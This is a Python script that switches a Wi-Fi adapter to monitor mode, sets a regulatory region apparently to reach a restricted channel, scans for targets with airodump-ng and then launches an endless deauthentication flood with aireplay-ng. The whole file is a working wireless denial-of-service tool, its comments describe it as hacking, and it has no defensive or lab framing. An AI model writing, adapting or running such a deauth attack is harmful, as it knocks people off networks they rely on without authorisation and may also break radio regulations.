import os
import subprocess
import time
import signal
import sys

# --- CONFIGURATION ---
INTERFACE = "wlan1"
CHANNEL = "136"
REGION = "BO"
SCAN_TIME = 60 # Seconds to find targets before blasting
# ---------------------

def run_cmd(cmd):
    subprocess.call(cmd, shell=True)

def cleanup(sig, frame):
    print("\n[+] Cleaning up... Restoring Managed Mode.")
    run_cmd(f"nmcli device set {INTERFACE} managed yes")
    run_cmd(f"ip link set {INTERFACE} down")
    run_cmd(f"iw dev {INTERFACE} set type managed")
    run_cmd(f"ip link set {INTERFACE} up")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)

def main():
    if os.geteuid() != 0:
        print("[-] Run as sudo!")
        return

    print(f"[+] Setting Region to {REGION}...")
    run_cmd(f"iw reg set {REGION}")
    
    # Logic: Keep wlan0 (internet) alive, take wlan1 for hacking
    run_cmd(f"nmcli device set {INTERFACE} managed no")
    run_cmd(f"ip link set {INTERFACE} down")
    run_cmd(f"iw dev {INTERFACE} set type monitor")
    run_cmd(f"ip link set {INTERFACE} up")
    run_cmd(f"iw dev {INTERFACE} set channel {CHANNEL} HT20")

    print(f"[+] Scanning Channel {CHANNEL} for {SCAN_TIME} seconds...")
    # This creates a temporary CSV of targets
    scan = subprocess.Popen(f"airodump-ng {INTERFACE} -c {CHANNEL} -w /tmp/scan --output-format csv", shell=True)
    time.sleep(SCAN_TIME)
    scan.terminate()

    print("[+] Beginning automated deauth on all discovered MACs...")
    # Logic: Forces packets out even if the driver acts "shitty" using -D
    run_cmd(f"aireplay-ng --deauth 0 -D {INTERFACE}")

if __name__ == "__main__":
    main()

